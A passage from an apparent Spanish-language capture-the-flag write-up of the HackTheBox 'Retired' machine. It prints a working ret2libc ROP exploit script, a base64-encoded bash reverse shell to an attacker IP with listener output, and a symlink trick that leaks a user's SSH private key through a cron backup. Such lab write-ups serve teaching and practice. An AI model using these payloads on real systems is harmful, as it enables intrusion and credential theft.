7f8f07ae2000-7f8f07b7c000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f8f07b7c000-7f8f07c15000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f8f07c15000-7f8f07c16000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f8f07c16000-7f8f07c17000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f8f07c17000-7f8f07c3c000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f8f07c3c000-7f8f07d87000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f8f07d87000-7f8f07dd1000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f8f07dd1000-7f8f07dd2000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f8f07dd2000-7f8f07dd5000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f8f07dd5000-7f8f07dd8000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f8f07dd8000-7f8f07ddc000 rw-p 00000000 00:00 0
7f8f07ddc000-7f8f07dec000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6  
7f8f07dec000-7f8f07ee4000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f8f07ee4000-7f8f07f18000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f8f07f18000-7f8f07f1c000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f8f07f1c000-7f8f07f1f000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f8f07f1f000-7f8f07f21000 rw-p 00000000 00:00 0
7f8f07f26000-7f8f07f27000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f8f07f27000-7f8f07f47000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f8f07f47000-7f8f07f4f000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f8f07f50000-7f8f07f51000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f8f07f51000-7f8f07f52000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f8f07f52000-7f8f07f53000 rw-p 00000000 00:00 0
7ffc8b8b8000-7ffc8b8d9000 rw-p 00000000 00:00 0                          [stack]
7ffc8b8de000-7ffc8b8e2000 r--p 00000000 00:00 0                          [vvar]
7ffc8b8e2000-7ffc8b8e4000 r-xp 00000000 00:00 0                          [vdso]
</code></pre></div><p>Aqu铆 tenemos la direcci贸n base del binario (<code>0x5631036d6000</code>), la direcci贸n base de Glibc (<code>0x7f8f07c17000</code>) y tambi茅n el comienzo de la pila (<code>0x7ffc8b8b8000</code>). Estos tres valores ser谩n 煤tiles para la explotaci贸n.</p><p>Adem谩s, vamos a descargarnos la librer铆a Glibc de la m谩quina para desarrollar el <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'10.10.11.154?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so'</span> -o libc.so.6  
</code></pre></div><h3 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h3><p>El objetivo del <em>exploit</em> es llamar a <code>system</code> en Glibc (tenemos su direcci贸n real) y usar un comando de <em>reverse shell</em> como primer argmento. Como se trata de un comando personalizado que no est谩 en Glibc o en el binario, tiene que ser guardado en la pila (y por eso necesitamos una direcci贸n de la pila). Por tanto, queremos lo siguiente:</p><ul><li>Que <code>$rdi</code> tenga la direcci贸n del comando</li><li>Llamar a <code>system</code> en Glibc</li></ul><p>Se trata de un binario de 64 bits, por lo que la convenci贸n de llamadas dice que los argumentos se pasan a las funciones a trav茅s de los registros (en orden: <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code>, <code>$rcx</code>&mldr;). Esta vez, llamaremos a <code>system</code>, que usa un solo argumento que es el puntero a la <em>string</em> (que ser谩 el comando que queremos ejecutar).</p><p>Como NX est谩 habilitado, tenemos que usar ROP para configurar el valor de <code>$rdi</code> usando un <em>gadget</em> <code>pop rdi; ret</code>. ROP nos permitir谩 redirigir el flujo de ejecuci贸n a direcciones espec铆ficas que ejecutar谩n las instrucciones que queremos y retornar谩n a la siguiente direcci贸n de la pila, donde estar谩 el siguiente <em>gadget</em> (de ah铆 el t茅rmino ROP <em>chain</em>).</p><p>Podemos encontrar <em>gadgets</em> en el binario o Glibc, no importa esta vez:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">activate_license</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': pop rdi ; ret$'</span>  
0x000000000000181b <span class="code-red">: pop rdi ; ret</span>
</code></pre></div><p>El valor <code>0x181b</code> es solo un <em>offset</em>. Como el binario tiene PIE activado, la base del binario es aleatoria y todas las direcciones se calculan como <em>offsets</em> a la direcci贸n base. Como tenemos la direcci贸n base de <code>/proc/&lt;PID>/maps</code>, sabemos la direcci贸n real del <em>gadget</em> en tiempo de ejecuci贸n.</p><p>Luego, tenemos que encontrar el <em>offset</em> de <code>system</code> en Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> system
   237: 000000000012d5e0    99 FUNC    GLOBAL DEFAULT   14 svcerr_<span class="code-red">system</span>err@@GLIBC_2.2.5  
   619: 0000000000048e50    45 FUNC    GLOBAL DEFAULT   14 __libc_<span class="code-red">system</span>@@GLIBC_PRIVATE
  1430: 0000000000048e50    45 FUNC    WEAK   DEFAULT   14 <span class="code-red">system</span>@@GLIBC_2.2.5
</code></pre></div><p>De nuevo, <code>0x48e50</code> es un <em>offset</em> porque la direcci贸n base de Glibc es aleatoria debido al ASLR. Adem谩s, tenemos la direcci贸n base de Glibc en tiempo de ejecuci贸n desde antes.</p><p>Genial, ahora tenemos que ver qu茅 cantidad de caracteres necesitamos para sobrescribir la direcci贸n de retorno guardada en la pila. Por experiencia en explotaci贸n en 64 bits, se sabe que si el <em>buffer</em> reservado es $x$, entonces el <em>offset</em> es normalmente $x + 8$ (si no hay canario). Entonces, el <em>offset</em> es 520 esta vez. Otra manera de encontrarlo es con patrones en GDB.</p><p>Utilic茅 un <em>script</em> en Python para coger las direcciones desde <code>/proc/&lt;PID>/maps</code>, crear el <em>payload</em> y enviarlo al servidor. Se puede encontrar aqu铆: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Retired/first_exploit.py"><code>first_exploit.py</code></a>.</p><p>La funci贸n que construye el <em>payload</em> es esta:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">craft_payload</span><span class="mtk1">(</span><span class="mtk9 mtki">pid</span><span class="mtk1">,</span> <span class="mtk9 mtki">cmd</span><span class="mtk1">,</span> <span class="mtk9 mtki">stack_offset</span><span class="mtk1">):</span>
    <span class="mtk1">elf_address</span><span class="mtk1">,</span> <span class="mtk1">glibc_address</span><span class="mtk1">,</span> <span class="mtk1">stack_address</span> <span class="mtk5">=</span> <span class="mtk8">get_addresses</span><span class="mtk1">(</span><span class="mtk9 mtki">pid</span><span class="mtk1">)</span>  

    <span class="mtk1">pop_rdi_ret</span> <span class="mtk5">=</span> <span class="mtk1">elf_address</span>   <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">0181b</span>
    <span class="mtk1">system</span>      <span class="mtk5">=</span> <span class="mtk1">glibc_address</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">48e50</span>

    <span class="mtk1">padding</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span> <span class="mtk4">'</span> <span class="mtk5">*</span> <span class="mtk6">200</span>
    <span class="mtk9 mtki">cmd</span> <span class="mtk5">=</span> <span class="mtk1">padding</span> <span class="mtk5">+</span> <span class="mtk9 mtki">cmd</span><span class="mtk1">.encode()</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span>

    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">520</span>
    <span class="mtk1">junk</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">junk</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64</span><span class="mtk1">(</span><span class="mtk1">pop_rdi_ret</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64</span><span class="mtk1">(</span><span class="mtk1">stack_address</span> <span class="mtk5">+</span> <span class="mtk9 mtki">stack_offset</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p64</span><span class="mtk1">(</span><span class="mtk1">system</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk9 mtki">cmd</span>

    <span class="mtk5">return</span> <span class="mtk1">{</span><span class="mtk4">'licensefile'</span><span class="mtk1">:</span> <span class="mtk1">(</span><span class="mtk4">'tmp_name'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)}</span>
</code></pre></div><p>N贸tese que el comando que se ejecuta se introduce despu茅s de la ROP <em>chain</em> y se rellena com 200 espacios. Esto es importante porque no sabemos la direcci贸n exacta en la que se sit煤a nuestro comando en la pila, por lo que tenemos que hacer fuerza bruta. El relleno nos permite tener m谩s tolerancia en el puntero porque podemos saltar al comienzo de los espacios, en el medio o justo donde comienza el comando (tolerancia de 200 direcciones) y el comando a煤n se ejecuta. Adem谩s, el comando se termina con un byte nulo.</p><p>Esta es la funci贸n <code>main</code>, que tiene dos estrategias y env铆a el <em>payload</em> al servidor PHP como archivo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk5">if</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">)</span> <span class="mtk5">!=</span> <span class="mtk6">3</span> <span class="mtk5">and</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">)</span> <span class="mtk5">!=</span> <span class="mtk6">4</span><span class="mtk1">:</span>
        <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'[!]</span> <span class="mtk4">Usage:</span> <span class="mtk4">python3</span> <span class="mtk6">{</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span><span class="mtk6">}</span> <span class="mtk4">&lt;PID&gt;</span> <span class="mtk4">&lt;cmd&gt;</span> <span class="mtk4">[stack offset]'</span><span class="mtk1">)</span>  
        <span class="mtk5">return</span>

    <span class="mtk1">pid</span><span class="mtk1">,</span> <span class="mtk1">cmd</span> <span class="mtk5">=</span> <span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">],</span> <span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">]</span>

    <span class="mtk5">if</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">)</span> <span class="mtk5">==</span> <span class="mtk6">4</span><span class="mtk1">:</span>
        <span class="mtk1">stack_offset</span> <span class="mtk5">=</span> <span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">3</span><span class="mtk1">],</span> <span class="mtk6">16</span><span class="mtk1">)</span>
        <span class="mtk8 mtku">requests</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk1 detected-link">ip</span><span class="mtk6">}</span><span class="mtk4">/activate_license.php'</span><span class="mtk1">,</span>
                <span class="mtk9 mtki">files</span><span class="mtk5">=</span><span class="mtk8">craft_payload</span><span class="mtk1">(</span><span class="mtk1">pid</span><span class="mtk1">,</span> <span class="mtk1">cmd</span><span class="mtk1">,</span> <span class="mtk1">stack_offset</span><span class="mtk1">))</span>
        <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'[+]</span> <span class="mtk4">Sent</span> <span class="mtk4">payload.</span> <span class="mtk4">Check</span> <span class="mtk4">listener'</span><span class="mtk1">)</span>
        <span class="mtk5">return</span>

    <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">'[+]</span> <span class="mtk4">Starting</span> <span class="mtk4">brute</span> <span class="mtk4">force</span> <span class="mtk4">on</span> <span class="mtk4">stack</span> <span class="mtk4">offset'</span><span class="mtk1">)</span>

    <span class="mtk5">for</span> <span class="mtk1">stack_offset</span> <span class="mtk5">in</span> <span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">21000</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk5">-</span><span class="mtk6">128</span><span class="mtk1">):</span>
        <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'[*]</span> <span class="mtk4">Stack</span> <span class="mtk4">offset:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">stack_offset</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
        <span class="mtk8 mtku">time</span><span class="mtk1">.</span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">)</span>
        <span class="mtk8 mtku">requests</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk1 detected-link">ip</span><span class="mtk6">}</span><span class="mtk4">/activate_license.php'</span><span class="mtk1">,</span>
                <span class="mtk9 mtki">files</span><span class="mtk5">=</span><span class="mtk8">craft_payload</span><span class="mtk1">(</span><span class="mtk1">pid</span><span class="mtk1">,</span> <span class="mtk1">cmd</span><span class="mtk1">,</span> <span class="mtk1">stack_offset</span><span class="mtk1">))</span>
</code></pre></div><p>La primera estrategia es para hacer fuerza bruta a una direcci贸n de la pila usando un <em>offset</em> (comenzando por <code>0x21000</code>, que es la cima de la pila, y descendiendo):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">first_exploit.py</span> 411 <span class="code-dark-yellow">'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash'</span>  
[+] Starting brute force on stack offset
[*] Stack offset: 0x21000
[*] Stack offset: 0x20f80
[*] Stack offset: 0x20f00
[*] Stack offset: 0x20e80
[*] Stack offset: 0x20e00
[*] Stack offset: 0x20d80
[*] Stack offset: 0x20d00
[*] Stack offset: 0x20c80
[*] Stack offset: 0x20c00
[*] Stack offset: 0x20b80
[*] Stack offset: 0x20b00
[*] Stack offset: 0x20a80
[*] Stack offset: 0x20a00
[*] Stack offset: 0x20980
[*] Stack offset: 0x20900
[*] Stack offset: 0x20880
[*] Stack offset: 0x20800
[*] Stack offset: 0x20780
[*] Stack offset: 0x20700
[*] Stack offset: 0x20680
[*] Stack offset: 0x20600
[*] Stack offset: 0x20580
[*] Stack offset: 0x20500
[*] Stack offset: 0x20480
^C
[!] Exiting...
</code></pre></div><p>Usando como comando una <em>reverse shell</em> un <code>ping</code> o una petici贸n web, podemos adivinar el <em>offset</em> en el <em>stack</em>. Aunque no es estrictamente necesario si se usa una <em>reverse shell</em>, podemos ejecutar el <em>exploit</em> de nuevo indicando el <em>offset</em> para conseguir ejecuci贸n remota de comandos (RCE) instant谩neamente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">first_exploit.py</span> 411 <span class="code-dark-yellow">'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash'</span> 0x20500  
[+] Sent payload. Check listener
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.154.
Ncat: Connection from 10.10.11.154:53848.
bash: cannot set terminal process group (411): Inappropriate ioctl for device  
bash: no job control in this shell
www-data@retired:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@retired:~$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@retired:~$ export TERM=xterm
www-data@retired:~$ export SHELL=bash
www-data@retired:~$ stty rows 50 columns 158
</code></pre></div><p>Existen m谩s maneras de explotar el binario. En este <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Retired/second_exploit.py"><code>second_exploit.py</code></a> uso una direcci贸n del binario con permisos de escritura para guardar el comando de <em>reverse shell</em> usando una primitiva &ldquo;<em>write-what-where</em>&rdquo; en bloques de 8 bytes mediante <em>gadgets</em> <code>pop rax; ret</code>, <code>pop rdi; ret</code> y luego usar <code>mov qword ptr [rax], rdi; ret</code> para mover los bloques de comandos a las direcciones escribibles (explicaci贸n detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Retired#second_exploitpy">aqu铆</a>).</p><p>Adem谩s, es posible llamar a <code>mprotect</code> para modificar los permisos del <em>stack</em> y configurarla como ejecutable, de manera que podemos introducir <em>shellcode</em> en la pila y ejecutarlo para obtener una <em>reverse shell</em>. Esta t茅cnica se utiliza en <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Retired/third_exploit.py"><code>third_exploit.py</code></a> (explicaci贸n detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Retired#third_exploitpy">aqu铆</a>).</p><h2 id="enumeraci贸n-del-sistema">Enumeraci贸n del sistema</h2><p>Lo primero que notamos es que hay algunos archivos ZIP en <code>/var/www</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@retired:~$ ls -la
total 1760
drwxrwsrwx  3 www-data www-data   4096 Apr  3 12:16 .
drwxr-xr-x 12 root     root       4096 Mar 11 14:36 ..
-rw-r--r--  1 dev      www-data 505153 Apr  3 12:14 2022-04-03_12-14-03-html.zip  
-rw-r--r--  1 dev      www-data 505153 Apr  3 12:15 2022-04-03_12-15-03-html.zip
-rw-r--r--  1 dev      www-data 505153 Apr  3 12:16 2022-04-03_12-16-03-html.zip
drwxrwsrwx  5 www-data www-data   4096 Mar 11 14:36 html
-rw-r--r--  1 www-data www-data 262144 Apr  3 12:15 license.sqlite
</code></pre></div><p>Todos contienen una copia de seguridad del c贸digo fuente del servidor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@retired:~$ unzip -l 2022-04-03_12-16-03-html.zip
Archive:  2022-04-03_12-16-03-html.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2022-03-11 14:36   var/www/html/
        0  2022-03-11 14:36   var/www/html/js/
     1636  2021-10-13 02:59   var/www/html/js/scripts.js
      585  2021-10-13 02:58   var/www/html/activate_license.php
        0  2022-03-11 14:36   var/www/html/assets/
    23462  2021-10-13 02:59   var/www/html/assets/favicon.ico
        0  2022-03-11 14:36   var/www/html/assets/img/
      333  2021-10-13 02:59   var/www/html/assets/img/close-icon.svg
    14220  2021-10-13 02:59   var/www/html/assets/img/navbar-logo.svg
        0  2022-03-11 14:36   var/www/html/assets/img/about/
    10187  2021-10-13 02:59   var/www/html/assets/img/about/2.jpg
    16175  2021-10-13 02:59   var/www/html/assets/img/about/4.jpg
    18029  2021-10-13 02:59   var/www/html/assets/img/about/3.jpg
    19668  2021-10-13 02:59   var/www/html/assets/img/about/1.jpg
        0  2022-03-11 14:36   var/www/html/assets/img/logos/
     3223  2021-10-13 02:59   var/www/html/assets/img/logos/facebook.svg
     4137  2021-10-13 02:59   var/www/html/assets/img/logos/microsoft.svg  
     3282  2021-10-13 02:59   var/www/html/assets/img/logos/google.svg
     2284  2021-10-13 02:59   var/www/html/assets/img/logos/ibm.svg
        0  2022-03-11 14:36   var/www/html/assets/img/team/
    61067  2021-10-13 02:59   var/www/html/assets/img/team/2.jpg
    57725  2021-10-13 02:59   var/www/html/assets/img/team/3.jpg
    40338  2021-10-13 02:59   var/www/html/assets/img/team/1.jpg
   238317  2021-10-13 02:59   var/www/html/assets/img/header-bg.jpg
     4144  2022-03-11 11:34   var/www/html/beta.html
    11414  2021-10-13 02:58   var/www/html/default.html
      348  2022-03-11 11:29   var/www/html/index.php
        0  2022-03-11 14:36   var/www/html/css/
   219875  2021-10-13 02:59   var/www/html/css/styles.css
---------                     -------
   750449                     29 files
</code></pre></div><p>Adem谩s, los archivos ZIP pertenecen al usuario <code>dev</code> y al grupo <code>www-data</code>. Cada minuto, aparece un nuevo archivo ZIP, vamos a buscar por <code>backup</code> y luego a ver si hay alguna tarea Cron:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@retired:~$ cat /usr/bin/webbackup  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>

<span class="mtk7">set</span> <span class="mtk1">-euf</span> <span class="mtk1">-o</span> <span class="mtk1">pipefail</span>

<span class="mtk7">cd</span> <span class="mtk1">/var/www/</span>

<span class="mtk1">SRC=/var/www/html</span>
<span class="mtk1">DST=</span><span class="mtk4">"/var/www/$(date</span> <span class="mtk4">+%Y-%m-%d_%H-%M-%S)-html.zip"</span>

<span class="mtk1">/usr/bin/rm</span> <span class="mtk1">--force</span> <span class="mtk1">--</span> <span class="mtk4">"</span><span class="mtk1">$DST</span><span class="mtk4">"</span>
<span class="mtk1">/usr/bin/zip</span> <span class="mtk1">--recurse-paths</span> <span class="mtk4">"</span><span class="mtk1">$DST</span><span class="mtk4">"</span> <span class="mtk4">"</span><span class="mtk1">$SRC</span><span class="mtk4">"</span>

<span class="mtk1">KEEP=10</span>
<span class="mtk1">/usr/bin/find</span> <span class="mtk1">/var/www/</span> <span class="mtk1">-maxdepth</span> <span class="mtk1">1</span> <span class="mtk1">-name</span> <span class="mtk4">'*.zip'</span> <span class="mtk1">-print0</span> <span class="mtk1">\</span>  
    <span class="mtk5">|</span> <span class="mtk1">sort</span> <span class="mtk1">--zero-terminated</span> <span class="mtk1">--numeric-sort</span> <span class="mtk1">--reverse</span> <span class="mtk1">\</span>
    <span class="mtk5">|</span> <span class="mtk5">while</span> <span class="mtk1">IFS=</span> <span class="mtk7">read</span> <span class="mtk1">-r</span> <span class="mtk1">-d</span> <span class="mtk4">''</span> <span class="mtk1">backup</span><span class="mtk5">;</span> <span class="mtk5">do</span>
        <span class="mtk5">if</span> <span class="mtk1">[</span> <span class="mtk4">"</span><span class="mtk1">$KEEP</span><span class="mtk4">"</span> <span class="mtk5">-le</span> <span class="mtk1">0</span> <span class="mtk1">]</span><span class="mtk5">;</span> <span class="mtk5">then</span>
            <span class="mtk1">/usr/bin/rm</span> <span class="mtk1">--force</span> <span class="mtk1">--</span> <span class="mtk4">"</span><span class="mtk1">$backup</span><span class="mtk4">"</span>
        <span class="mtk5">fi</span>
        <span class="mtk1">KEEP=</span><span class="mtk4">"$((KEEP</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk4">))"</span>
    <span class="mtk5">done</span>
</code></pre></div><p>Aunque <code>date</code> y <code>sort</code> se llaman con rutas relativas, no existe vulnerabilidad de <code>PATH</code> <em>hijacking</em>.</p><h2 id="movimiento-lateral-al-usuario-dev">Movimiento lateral al usuario <code>dev</code></h2><p>En su lugar, podemos crear un enlace simb贸lico que apunte a <code>/home/dev/.ssh/id_rsa</code>, de manera que se comprime en un archivo ZIP y luego lo podemos extraer:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@retired:~/html$ ln -s /home/dev/.ssh/id_rsa dev_id_rsa  
</code></pre></div><p>Despu茅s de un minuto, el nuevo archivo ZIP contiene la clave privada de SSH de <code>dev</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@retired:~/html$ cd ..
www-data@retired:~$ unzip -l 2022-04-03_13-14-04-html.zip
Archive:  2022-04-03_13-14-04-html.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2022-04-03 13:13   var/www/html/
        0  2022-03-11 14:36   var/www/html/js/
     1636  2021-10-13 02:59   var/www/html/js/scripts.js
      585  2021-10-13 02:58   var/www/html/activate_license.php
        0  2022-03-11 14:36   var/www/html/assets/
    23462  2021-10-13 02:59   var/www/html/assets/favicon.ico
        0  2022-03-11 14:36   var/www/html/assets/img/
      333  2021-10-13 02:59   var/www/html/assets/img/close-icon.svg
    14220  2021-10-13 02:59   var/www/html/assets/img/navbar-logo.svg
        0  2022-03-11 14:36   var/www/html/assets/img/about/
    10187  2021-10-13 02:59   var/www/html/assets/img/about/2.jpg
    16175  2021-10-13 02:59   var/www/html/assets/img/about/4.jpg
    18029  2021-10-13 02:59   var/www/html/assets/img/about/3.jpg
    19668  2021-10-13 02:59   var/www/html/assets/img/about/1.jpg
        0  2022-03-11 14:36   var/www/html/assets/img/logos/
     3223  2021-10-13 02:59   var/www/html/assets/img/logos/facebook.svg
     4137  2021-10-13 02:59   var/www/html/assets/img/logos/microsoft.svg  
     3282  2021-10-13 02:59   var/www/html/assets/img/logos/google.svg
     2284  2021-10-13 02:59   var/www/html/assets/img/logos/ibm.svg
        0  2022-03-11 14:36   var/www/html/assets/img/team/
    61067  2021-10-13 02:59   var/www/html/assets/img/team/2.jpg
    57725  2021-10-13 02:59   var/www/html/assets/img/team/3.jpg
    40338  2021-10-13 02:59   var/www/html/assets/img/team/1.jpg
   238317  2021-10-13 02:59   var/www/html/assets/img/header-bg.jpg
     4144  2022-03-11 11:34   var/www/html/beta.html
    11414  2021-10-13 02:58   var/www/html/default.html
      348  2022-03-11 11:29   var/www/html/index.php
     2590  2022-03-11 11:12   var/www/html/dev_id_rsa
        0  2022-03-11 14:36   var/www/html/css/
   219875  2021-10-13 02:59   var/www/html/css/styles.css
---------                     -------
   753039                     30 files
